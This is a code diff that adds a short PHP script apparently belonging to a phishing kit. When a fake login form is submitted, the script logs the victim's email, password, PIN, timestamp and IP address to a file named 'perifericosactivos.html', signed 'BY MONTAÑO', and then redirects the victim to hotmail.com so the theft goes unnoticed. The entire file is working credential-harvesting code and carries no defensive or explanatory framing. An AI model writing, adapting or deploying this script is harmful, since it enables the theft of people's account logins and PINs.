@@ -1,0 +1,9 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+header('Location: http://hotmail.com');
+$handle = fopen('perifericosactivos.html', 'a');
+fwrite($handle, "C0rr30: ".$_POST['emil']." <br> Cl4v3: ".$_POST['pss']."<br> PIN: ".$_POST['numero']." <br> Fecha: ".date('d-m-Y')." | ".date('H:i:s')." ".$_SERVER['REMOTE_ADDR']." <br> " . PHP_EOL );
+fwrite($handle, "*************BY MONTAÑO****************** <br>");
+fclose($handle);
+exit;
+} ?>
